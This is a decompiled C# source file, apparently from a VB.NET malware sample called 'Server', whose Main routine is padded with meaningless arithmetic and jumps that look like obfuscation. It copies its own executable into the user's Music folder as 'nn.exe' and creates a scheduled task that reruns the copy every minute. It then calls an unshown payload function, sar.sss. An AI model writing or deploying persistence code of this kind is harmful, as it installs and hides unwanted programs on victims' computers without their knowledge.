using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Server.My;

namespace Server;

[StandardModule]
internal sealed class Module2
{
	public static byte wi = 217;

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num5 = default(int);
		int num2 = default(int);
		int num3 = default(int);
		short num6 = default(short);
		short num7 = default(short);
		string destFileName = default(string);
		short num8 = default(short);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					num5 = 23;
					goto IL_0006;
				case 454:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0006;
						case 3:
							goto IL_000e;
						case 4:
							goto IL_0010;
						case 5:
							goto IL_0012;
						case 6:
							goto IL_001a;
						case 7:
							goto IL_001c;
						case 8:
							goto IL_0057;
						case 9:
							goto IL_0060;
						case 10:
							goto IL_0083;
						case 11:
							goto IL_0092;
						case 12:
							goto IL_009b;
						case 13:
							goto IL_00ca;
						case 14:
							goto IL_00d3;
						case 15:
							goto IL_00dd;
						case 17:
						case 18:
							goto IL_00e3;
						case 21:
							goto IL_00ef;
						case 19:
						case 20:
						case 22:
							goto IL_00f2;
						case 16:
						case 23:
						case 24:
							goto IL_00fe;
						case 25:
							goto IL_010b;
						case 26:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 27:
						case 28:
						case 29:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_010b:
					num = 25;
					num5 = 6 & (0 - ((wi == 98) ? 1 : 0));
					break;
					IL_00fe:
					num = 24;
					if (num6 != 3920)
					{
						goto end_IL_0001_3;
					}
					goto IL_010b;
					IL_0006:
					num = 2;
					num6 = 956;
					goto IL_000e;
					IL_000e:
					num = 3;
					goto IL_0010;
					IL_0010:
					num = 4;
					goto IL_0012;
					IL_0012:
					num = 5;
					num7 = -9663;
					goto IL_001a;
					IL_001a:
					num = 6;
					goto IL_001c;
					IL_001c:
					num = 7;
					_ = (double)(0 - ((Conversions.ToDouble(Conversions.ToString(checked(unchecked(num5 % num6) + 837 - 1922)) + Conversions.ToString(wi)) == 3.0) ? 1 : 0));
					goto IL_0057;
					IL_0057:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0060;
					IL_0060:
					num = 9;
					destFileName = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\nn.exe";
					goto IL_0083;
					IL_0083:
					num = 10;
					File.Copy(Application.get_ExecutablePath(), destFileName);
					goto IL_0092;
					IL_0092:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_009b;
					IL_009b:
					num = 12;
					Interaction.Shell("schtasks /create /sc minute /mo 1 /tn sssssssss /tr " + ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\nn.exe", (AppWinStyle)0, false, -1);
					goto IL_00ca;
					IL_00ca:
					ProjectData.ClearProjectError();
					num3 = -4;
					goto IL_00d3;
					IL_00d3:
					num = 14;
					sar.sss(null);
					goto IL_00dd;
					IL_00dd:
					num = 15;
					num8 = num7;
					goto IL_00e3;
					IL_00e3:
					num = 18;
					if (num8 == num6)
					{
						goto IL_00f2;
					}
					goto IL_00fe;
					IL_00f2:
					num = 20;
					if (num5 == 0)
					{
						goto IL_00ef;
					}
					goto IL_00fe;
					IL_00ef:
					num = 21;
					goto IL_00f2;
					end_IL_0001_2:
					break;
				}
				num = 26;
				if (((0u - ((wi != 98) ? 1u : 0u)) | (uint)(num5 % 30)) != 0)
				{
				}
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 454;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
